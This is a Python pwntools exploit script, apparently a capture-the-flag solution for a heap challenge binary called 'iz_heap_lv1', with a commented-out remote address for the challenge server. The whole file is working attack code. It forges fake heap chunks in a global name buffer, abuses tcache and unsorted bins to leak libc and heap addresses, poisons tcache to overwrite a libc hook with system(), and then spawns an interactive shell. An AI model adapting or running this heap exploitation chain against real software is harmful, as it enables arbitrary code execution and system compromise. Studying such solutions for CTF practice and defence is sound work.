from pwn import *
io=process("./iz_heap_lv1")
#io=remote("165.22.110.249",3333)
payload=p64(0x602120)+p64(0)*2+p64(0x91)+p64(0)*17+p64(0x21)+p64(0)*3+p64(0x91)
io.sendlineafter("Input name: ",payload)
def add(size,data):
	io.sendlineafter("Choice: ","1")
	io.sendlineafter("Enter size: ",str(size))
	io.sendlineafter("Enter data: ",data)

def edit(index,size,data):
	io.sendlineafter("Choice: ","2")
	io.sendlineafter("Enter index: ",str(index))
	io.sendlineafter("Enter size: ",str(size))
	io.sendlineafter("Enter data: ",data)
def delete(index):
	io.sendlineafter("Choice: ","3")
	io.sendlineafter("Enter index: ",str(index))
def viewname(option):
	io.sendlineafter("Choice: ","4")
	io.sendlineafter("DO you want to edit: (Y/N)",option)
for i in range(20):
	add(0x7f,str(i)+"b"*0x60)
for i in range(7):
	delete(i)
delete(20)
viewname("Y")
io.sendafter("Input name: ","a"*32)
io.recvuntil("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
leak=io.recv(6)+'\x00\x00'
libc_leak=hex(u64(leak))
viewname("Y")
payload=p64(0)*3+p64(0x91)
io.sendafter("Input name: ",payload)
for i in range(8):
	add(0x7f,str(i)+"b"*0x60)
viewname("Y")
io.sendafter("Input name: ",p64(0))
add(0x7f,str(i)+"b"*0x60)
viewname("N")
io.recvuntil("Name: ")
leak=io.recvline().strip()
heap_leak=u64(leak.ljust(8, '\x00'))
libc_leak=int(libc_leak,16)
delete(0)
add(0x40,"0"*20)
print hex(libc_leak)
position=heap_leak+0x90
viewname("Y")
payload= p64(0x602120)+p64(0)*2+p64(0x41)+p64(0)*17+p64(0x21)+p64(0)*3+p64(0x91)
io.sendafter("Input name: ",payload)
delete(1)
add(0x30,"0"*20)
delete(1)
delete(20)
hook=libc_leak+0x2908
payload=p64(0)*3+p64(0x41)+p64(hook)+p64(heap_leak-0xd00)
viewname("Y")
io.sendafter("Input name: ",payload)
delete(2)
add(0x30,"sh")
system=libc_leak-0x191cd0
add(0x30,p64(system))
delete(1)
io.interactive()
